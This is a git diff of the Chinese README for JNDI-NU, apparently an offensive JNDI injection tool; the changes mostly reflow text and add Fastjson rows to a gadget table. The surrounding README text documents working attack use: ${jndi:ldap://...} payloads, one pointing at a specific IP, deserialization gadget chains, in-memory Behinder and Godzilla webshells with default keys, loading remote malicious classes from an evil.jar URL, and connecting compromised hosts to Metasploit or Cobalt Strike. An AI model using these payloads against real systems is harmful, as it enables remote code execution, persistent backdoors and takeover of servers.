@@ -18,11 +18,14 @@ Usage: java -jar JNDI-NU.jar [options]
 
 * 目前支持的所有 ```PayloadType``` 为
     * ```Bypass```: 用于rmi本地工厂类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
-    * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami```的方式传递想要执行的命令
-    * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
+    * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami```
+      的方式传递想要执行的命令
+    * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot```
+      时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
     * ```JbossEcho```: Jboss 命令执行回显, 通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
     * ```AllEcho```: Jboss 命令执行回显, 通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
     * ```nu1r```：用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输
+
 ```
 {{url
   (${jndi:ldap://0.0.0.0:1389/TomcatBypass/nu1r/Base64/{{base64
@@ -30,7 +33,6 @@ Usage: java -jar JNDI-NU.jar [options]
   }}})
 }}
 ```    
-
 
 - 支持tomcatBypass路由直接上线msf：
 
@@ -50,12 +52,13 @@ Usage: java -jar JNDI-NU.jar [options]
 
 使用说明：
 不指定类型就默认为冰蝎马。
+
 - t 选择内存马的类型
-  - 不指定类型就默认为冰蝎马
-  - bx: 冰蝎内存马，```key: nu1ryyds```, ```Referer：https://nu1r.cn/```
-  - gz: 哥斯拉内存马，```pass: nu1r```, ```Referer：https://nu1r.cn/```
-  - gzraw: 哥斯拉 raw 类型的内存马, ```pass: nu1r```, ```Referer：https://nu1r.cn/```
-  - cmd: cmd命令回显内存马。
+    - 不指定类型就默认为冰蝎马
+    - bx: 冰蝎内存马，```key: nu1ryyds```, ```Referer：https://nu1r.cn/```
+    - gz: 哥斯拉内存马，```pass: nu1r```, ```Referer：https://nu1r.cn/```
+    - gzraw: 哥斯拉 raw 类型的内存马, ```pass: nu1r```, ```Referer：https://nu1r.cn/```
+    - cmd: cmd命令回显内存马。
 - a：是否继承恶意类 AbstractTranslet
 - o：使用反射绕过
 - w：Windows下使用Agent写入
@@ -67,6 +70,7 @@ Usage: java -jar JNDI-NU.jar [options]
 - ht：隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/
 
 示例
+
 ```shell
 {{url
     (${jndi:ldap://111.229.10.212:1389/Basic/tomcatfilterjmx/shell/-u path223 -pw 123456 -r tth.cn})
@@ -119,6 +123,7 @@ RC ：Remote Call - 通过 URLClassLoader.loadClass()
 来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
 
 换成CS或者MSF生成的JAR包，即可完成一键上线。
+
 ```
 {{url
     (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
@@ -247,6 +252,8 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 | CommonsCollectionsK4                        | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                | CC6简化的写法的4.0版 |
 | CommonsCollectionsK5                        | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                | CC7的4.0版      |
 | CommonsCollectionsK6                        | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                | CC11的4.0版     |
+| Fastjson1                                   | Fastjosn 1.2.48                                                                                                                                                                                                                                                            |               |
+| Fastjson2                                   | Fastjosn 2+                                                                                                                                                                                                                                                                |               |
 | Groovy1                                     | org.codehaus.groovy:groovy:2.3.9                                                                                                                                                                                                                                           |               |
 | Hibernate1                                  | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final                                                                                                                                                                                     |               |
 | Hibernate2                                  | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final                                                                                                                                                                                     |               |
@@ -273,9 +280,10 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 
 - a：恶意类是否继承 AbstractTranslet
 - o：使用反射绕过
-~~- j：使用 ObjectInputStream/ObjectOutputStream 来构造序列化流~~（这个构造的流有BUG，还在思考修复）
+  ~~- j：使用 ObjectInputStream/ObjectOutputStream 来构造序列化流~~（这个构造的流有BUG，还在思考修复）
 
 * 使用示例：
+
 ```
 {{url
   (${jndi:ldap://0.0.0.0:1389/Deserialization/[GadgetType]/nu1r/Base64/{{base64
@@ -409,11 +417,13 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 
 对于使用了 `TemplatesImpl` 类来实现的链子来说，可以使用此方法
 
-如果你不想使用本项目中提供的恶意逻辑，也不想执行命令，可以通过自定义代码的形式，自定义代码将会在目标服务器通过 `ClassLoader` 进行加载并实例化。命令使用 `LF#` 开头，后面跟指定自定义类字节码文件的绝对路径。
+如果你不想使用本项目中提供的恶意逻辑，也不想执行命令，可以通过自定义代码的形式，自定义代码将会在目标服务器通过 `ClassLoader`
+进行加载并实例化。命令使用 `LF#` 开头，后面跟指定自定义类字节码文件的绝对路径。
 
 示例：
 
 **class 类文件绝对路径**
+
 ```
 {{url
   (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
@@ -447,13 +457,13 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 
 ![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownQQ截图20221107151444.png)
 
-
 # 🐳自定义
 
 + 自定义链子
 
 在 `com.nu1r.jndi.gadgets` 下新建JAVA文件，并实现接口 ObjectPayload 后在 getObject 方法中编写链子逻辑即可。
 使用
+
 ```
 {{url
     (${jndi:ldap://0.0.0.0:1389/Deserialization/自定义链子的类名/nu1r/Base64/{{base64
